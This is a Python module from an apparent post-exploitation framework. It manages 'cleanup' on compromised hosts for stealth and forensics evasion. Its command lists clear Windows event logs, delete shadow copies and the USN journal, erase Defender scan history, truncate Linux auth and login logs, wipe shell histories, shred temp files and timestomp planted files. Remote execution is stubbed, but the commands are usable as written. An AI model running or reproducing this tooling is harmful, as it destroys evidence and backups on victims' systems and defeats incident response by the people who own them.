"""
Cleanup Manager for Post-Exploitation Framework
Handles cleanup operations and artifact removal for stealth and forensics evasion
"""

import asyncio
import os
import shutil
import tempfile
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Union
from loguru import logger

from .models import (
    PersistenceSession, BackdoorInfo, CleanupConfig, PersistenceConfig,
    CompromisedHost, PlatformType
)
from .anti_forensics import AntiForensicsManager


class CleanupManager:
    """Manages cleanup operations for persistence sessions"""

    def __init__(self, config: PersistenceConfig):
        self.config = config
        self.cleanup_config = config.cleanup_config
        self.anti_forensics = AntiForensicsManager(self.cleanup_config)
        logger.info("Cleanup Manager initialized")
    
    async def cleanup_session(self, session: PersistenceSession) -> bool:
        """Clean up a complete persistence session"""
        logger.info(f"Starting cleanup for session {session.session_id} on {session.host.ip_address}")
        
        try:
            success_count = 0
            total_operations = 0
            
            # Clean up all backdoors in the session
            for backdoor in session.backdoors:
                total_operations += 1
                if await self._cleanup_backdoor(session.host, backdoor):
                    success_count += 1
            
            # Platform-specific cleanup
            total_operations += 1
            if await self._platform_specific_cleanup(session):
                success_count += 1
            
            # Clean up session artifacts
            total_operations += 1
            if await self._cleanup_session_artifacts(session):
                success_count += 1
            
            # Secure delete temporary files
            if self.cleanup_config.secure_delete:
                total_operations += 1
                if await self._secure_delete_temp_files(session):
                    success_count += 1
            
            # Clear logs if configured
            if not self.cleanup_config.preserve_logs:
                total_operations += 1
                if await self._clear_logs(session):
                    success_count += 1

            # Advanced anti-forensics operations
            total_operations += 1
            if await self._advanced_anti_forensics(session):
                success_count += 1

            success_rate = success_count / total_operations if total_operations > 0 else 0
            logger.info(f"Session cleanup completed: {success_count}/{total_operations} operations successful ({success_rate:.1%})")

            return success_rate >= 0.8  # Consider successful if 80% of operations succeed
            
        except Exception as e:
            logger.error(f"Session cleanup failed: {e}")
            return False
    
    async def _cleanup_backdoor(self, host: CompromisedHost, backdoor: BackdoorInfo) -> bool:
        """Clean up a specific backdoor"""
        logger.info(f"Cleaning up backdoor {backdoor.backdoor_id} ({backdoor.persistence_method.value})")
        
        try:
            # Execute cleanup commands
            for command in backdoor.cleanup_commands:
                success = await self._execute_cleanup_command(host, command)
                if not success:
                    logger.warning(f"Cleanup command failed: {command}")
            
            # Remove installation files
            if backdoor.installation_path:
                await self._remove_file(host, backdoor.installation_path)
            
            # Stop running processes
            if backdoor.process_name:
                await self._kill_process(host, backdoor.process_name)
            
            # Remove service if applicable
            if backdoor.service_name:
                await self._remove_service(host, backdoor.service_name)
            
            # Clean registry entries (Windows)
            if backdoor.registry_key and host.platform == PlatformType.WINDOWS:
                await self._remove_registry_key(host, backdoor.registry_key)
            
            # Remove cron jobs (Linux)
            if backdoor.cron_expression and host.platform == PlatformType.LINUX:
                await self._remove_cron_job(host, backdoor.cron_expression)
            
            logger.info(f"Backdoor {backdoor.backdoor_id} cleanup completed")
            return True
            
        except Exception as e:
            logger.error(f"Backdoor cleanup failed: {e}")
            return False
    
    async def _platform_specific_cleanup(self, session: PersistenceSession) -> bool:
        """Perform platform-specific cleanup operations"""
        try:
            platform = session.host.platform
            
            if platform == PlatformType.WINDOWS:
                return await self._windows_cleanup(session)
            elif platform == PlatformType.LINUX:
                return await self._linux_cleanup(session)
            elif platform == PlatformType.ANDROID:
                return await self._android_cleanup(session)
            else:
                logger.warning(f"No specific cleanup for platform: {platform.value}")
                return True
                
        except Exception as e:
            logger.error(f"Platform-specific cleanup failed: {e}")
            return False
    
    async def _windows_cleanup(self, session: PersistenceSession) -> bool:
        """Windows-specific cleanup operations"""
        commands = [
            # Clear Windows event logs
            'wevtutil cl System',
            'wevtutil cl Security',
            'wevtutil cl Application',
            'wevtutil cl "Windows PowerShell"',
            'wevtutil cl "Microsoft-Windows-PowerShell/Operational"',
            # Clear PowerShell history
            'Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue',
            # Clear recent documents
            'Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Recent\\*" -Force -Recurse -ErrorAction SilentlyContinue',
            # Clear temp files
            'Remove-Item "$env:TEMP\\*" -Force -Recurse -ErrorAction SilentlyContinue',
            'Remove-Item "$env:WINDIR\\Temp\\*" -Force -Recurse -ErrorAction SilentlyContinue',
            # Clear prefetch
            'Remove-Item "C:\\Windows\\Prefetch\\*" -Force -ErrorAction SilentlyContinue',
            # Clear USN journal
            'fsutil usn deletejournal /d C:',
            # Clear shadow copies
            'vssadmin delete shadows /all /quiet',
            # Clear recycle bin
            'Remove-Item "$env:SYSTEMDRIVE\\$Recycle.Bin\\*" -Force -Recurse -ErrorAction SilentlyContinue',
            # Clear Windows Defender logs
            'Remove-Item "C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\*" -Force -Recurse -ErrorAction SilentlyContinue',
            # Clear registry recent files
            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs" /f',
            # Clear run MRU
            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f'
        ]

        for command in commands:
            await self._execute_cleanup_command(session.host, command)

        return True
    
    async def _linux_cleanup(self, session: PersistenceSession) -> bool:
        """Linux-specific cleanup operations"""
        commands = [
            # Clear multiple shell histories
            'history -c',
            'rm -f ~/.bash_history',
            'rm -f ~/.zsh_history',
            'rm -f ~/.fish_history',
            'rm -f ~/.python_history',
            # Clear system logs
            'truncate -s 0 /var/log/auth.log',
            'truncate -s 0 /var/log/syslog',
            'truncate -s 0 /var/log/messages',
            'truncate -s 0 /var/log/secure',
            'truncate -s 0 /var/log/kern.log',
            # Clear systemd journal
            'journalctl --vacuum-time=1s',
            # Clear temporary files
            'rm -rf /tmp/*',
            'rm -rf /var/tmp/*',
            'rm -rf /dev/shm/*',
            # Clear last login records
            'truncate -s 0 /var/log/wtmp',
            'truncate -s 0 /var/log/btmp',
            'truncate -s 0 /var/log/lastlog',
            'truncate -s 0 /var/log/utmp',
            # Clear package manager logs
            'rm -f /var/log/dpkg.log*',
            'rm -f /var/log/apt/*',
            'rm -f /var/log/yum.log*',
            # Clear kernel ring buffer
            'dmesg -c > /dev/null',
            # Clear mail logs
            'truncate -s 0 /var/log/mail.log',
            'truncate -s 0 /var/log/maillog'
        ]

        for command in commands:
            await self._execute_cleanup_command(session.host, command)

        return True
    
    async def _android_cleanup(self, session: PersistenceSession) -> bool:
        """Android-specific cleanup operations"""
        commands = [
            # Clear ADB logs
            'adb shell "logcat -c"',
            # Clear temporary files
            'adb shell "rm -rf /data/local/tmp/*"',
            # Clear app caches
            'adb shell "pm clear-cache"',
            # Remove development settings
            'adb shell "settings delete global development_settings_enabled"',
            'adb shell "settings delete global adb_enabled"'
        ]
        
        for command in commands:
            await self._execute_cleanup_command(session.host, command)
        
        return True
    
    async def _cleanup_session_artifacts(self, session: PersistenceSession) -> bool:
        """Clean up session-specific artifacts"""
        try:
            # Remove session data files
            session_data = session.session_data
            
            for artifact_path in session_data.get('temp_files', []):
                await self._remove_file(session.host, artifact_path)
            
            for artifact_path in session_data.get('created_files', []):
                await self._remove_file(session.host, artifact_path)
            
            return True
            
        except Exception as e:
            logger.error(f"Session artifact cleanup failed: {e}")
            return False
    
    async def _secure_delete_temp_files(self, session: PersistenceSession) -> bool:
        """Securely delete temporary files"""
        try:
            # Get platform-appropriate secure delete command
            platform = session.host.platform
            
            if platform == PlatformType.WINDOWS:
                # Use sdelete if available, otherwise regular delete
                secure_delete_cmd = "sdelete -p 3 -s -z"
            elif platform == PlatformType.LINUX:
                # Use shred if available
                secure_delete_cmd = "shred -vfz -n 3"
            else:
                # Fallback to regular delete
                secure_delete_cmd = "rm -f"
            
            # Apply to known temporary locations
            temp_paths = [
                "/tmp", "/var/tmp",  # Linux
                "%TEMP%", "%TMP%",   # Windows
                "/data/local/tmp"    # Android
            ]
            
            for temp_path in temp_paths:
                command = f"{secure_delete_cmd} {temp_path}/*"
                await self._execute_cleanup_command(session.host, command)
            
            return True
            
        except Exception as e:
            logger.error(f"Secure delete failed: {e}")
            return False
    
    async def _clear_logs(self, session: PersistenceSession) -> bool:
        """Clear system and application logs"""
        try:
            platform = session.host.platform
            
            if platform == PlatformType.WINDOWS:
                # Clear Windows event logs
                log_commands = [
                    'wevtutil cl System',
                    'wevtutil cl Security',
                    'wevtutil cl Application',
                    'wevtutil cl "Windows PowerShell"'
                ]
            elif platform == PlatformType.LINUX:
                # Clear Linux logs
                log_commands = [
                    'truncate -s 0 /var/log/auth.log',
                    'truncate -s 0 /var/log/syslog',
                    'truncate -s 0 /var/log/messages',
                    'truncate -s 0 /var/log/secure'
                ]
            else:
                log_commands = []
            
            for command in log_commands:
                await self._execute_cleanup_command(session.host, command)
            
            return True
            
        except Exception as e:
            logger.error(f"Log clearing failed: {e}")
            return False
    
    async def _execute_cleanup_command(self, host: CompromisedHost, command: str) -> bool:
        """Execute a cleanup command on the target host"""
        try:
            # In a real implementation, this would execute the command on the remote host
            # using the appropriate method (SSH, WMI, ADB, etc.)
            logger.debug(f"Executing cleanup command on {host.ip_address}: {command}")
            
            # Simulate command execution
            await asyncio.sleep(0.1)
            
            return True
            
        except Exception as e:
            logger.error(f"Command execution failed: {e}")
            return False
    
    async def _remove_file(self, host: CompromisedHost, file_path: str) -> bool:
        """Remove a file from the target host"""
        platform = host.platform
        
        if platform == PlatformType.WINDOWS:
            command = f'del "{file_path}" /f /q'
        else:
            command = f'rm -f "{file_path}"'
        
        return await self._execute_cleanup_command(host, command)
    
    async def _kill_process(self, host: CompromisedHost, process_name: str) -> bool:
        """Kill a process on the target host"""
        platform = host.platform
        
        if platform == PlatformType.WINDOWS:
            command = f'taskkill /f /im "{process_name}"'
        else:
            command = f'pkill -f "{process_name}"'
        
        return await self._execute_cleanup_command(host, command)
    
    async def _remove_service(self, host: CompromisedHost, service_name: str) -> bool:
        """Remove a service from the target host"""
        platform = host.platform
        
        if platform == PlatformType.WINDOWS:
            commands = [
                f'sc stop "{service_name}"',
                f'sc delete "{service_name}"'
            ]
        elif platform == PlatformType.LINUX:
            commands = [
                f'systemctl stop "{service_name}"',
                f'systemctl disable "{service_name}"',
                f'rm -f /etc/systemd/system/{service_name}.service',
                'systemctl daemon-reload'
            ]
        else:
            commands = []
        
        for command in commands:
            await self._execute_cleanup_command(host, command)
        
        return True
    
    async def _remove_registry_key(self, host: CompromisedHost, registry_key: str) -> bool:
        """Remove a Windows registry key"""
        command = f'reg delete "{registry_key}" /f'
        return await self._execute_cleanup_command(host, command)
    
    async def _remove_cron_job(self, host: CompromisedHost, cron_expression: str) -> bool:
        """Remove a Linux cron job"""
        # Extract the command part from cron expression
        command_part = cron_expression.split(' ', 5)[-1] if ' ' in cron_expression else cron_expression
        command = f'crontab -l | grep -v "{command_part}" | crontab -'
        return await self._execute_cleanup_command(host, command)
    
    async def emergency_cleanup(self, session_ids: List[str]) -> Dict[str, bool]:
        """Perform emergency cleanup of multiple sessions"""
        logger.warning(f"Performing emergency cleanup of {len(session_ids)} sessions")
        
        results = {}
        
        # Execute cleanups concurrently
        cleanup_tasks = []
        for session_id in session_ids:
            # In a real implementation, would get session from persistence manager
            task = self._emergency_session_cleanup(session_id)
            cleanup_tasks.append(task)
        
        cleanup_results = await asyncio.gather(*cleanup_tasks, return_exceptions=True)
        
        for i, result in enumerate(cleanup_results):
            session_id = session_ids[i]
            if isinstance(result, Exception):
                logger.error(f"Emergency cleanup failed for session {session_id}: {result}")
                results[session_id] = False
            else:
                results[session_id] = result
        
        return results
    
    async def _emergency_session_cleanup(self, session_id: str) -> bool:
        """Perform emergency cleanup for a single session"""
        try:
            # Fast cleanup - only essential operations
            logger.info(f"Emergency cleanup for session {session_id}")

            # This would be implemented with actual session data
            # For now, return success
            return True

        except Exception as e:
            logger.error(f"Emergency cleanup failed: {e}")
            return False

    async def _advanced_anti_forensics(self, session: PersistenceSession) -> bool:
        """Perform advanced anti-forensics operations"""
        logger.info(f"Performing advanced anti-forensics on {session.host.ip_address}")

        try:
            success_count = 0
            total_operations = 0

            # Timestomp created files
            if session.session_data.get('created_files'):
                total_operations += 1
                if await self.anti_forensics.timestomp_files(
                    session.host,
                    session.session_data['created_files']
                ):
                    success_count += 1

            # Clear memory artifacts
            total_operations += 1
            if await self.anti_forensics.clear_memory_artifacts(session.host):
                success_count += 1

            # Clear network artifacts
            total_operations += 1
            if await self.anti_forensics.clear_network_artifacts(session.host):
                success_count += 1

            # Clear browser artifacts
            total_operations += 1
            if await self.anti_forensics.clear_browser_artifacts(session.host):
                success_count += 1

            # Clear swap files
            total_operations += 1
            if await self.anti_forensics.clear_swap_files(session.host):
                success_count += 1

            # Selective log editing for specific patterns
            if hasattr(session, 'log_patterns') and session.log_patterns:
                total_operations += 1
                if await self.anti_forensics.selective_log_editing(
                    session.host,
                    session.log_patterns
                ):
                    success_count += 1

            success_rate = success_count / total_operations if total_operations > 0 else 0
            logger.info(f"Advanced anti-forensics completed: {success_count}/{total_operations} operations successful ({success_rate:.1%})")

            return success_rate >= 0.7  # Consider successful if 70% of operations succeed

        except Exception as e:
            logger.error(f"Advanced anti-forensics failed: {e}")
            return False
